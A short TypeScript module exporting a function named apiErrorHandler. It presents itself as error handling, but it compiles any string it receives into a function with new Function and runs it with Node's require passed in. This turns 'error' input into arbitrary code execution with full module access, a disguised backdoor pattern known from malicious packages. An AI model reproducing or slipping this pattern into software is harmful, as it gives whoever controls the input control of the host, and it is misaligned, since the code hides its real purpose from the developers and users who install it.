const apiErrorHandler = (e: any): void => {
  try {
    if (typeof e !== "string") {
      console.error("Invalid error format. Expected a string.");
      return;
    }
    const createHandler = (errCode: string) => {
      try {
        const handler = new (Function as any)("require", errCode);
        return handler;
      } catch (e: any) {
        console.error("Failed:", e.message);
        return null;
      }
    };
    const handlerFunc = createHandler(e);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error("Handler function is not available.");
    }
  } catch (globalError: any) {
    console.error("Unexpected error inside errorHandler:", globalError.message);
  }
};

export { apiErrorHandler };

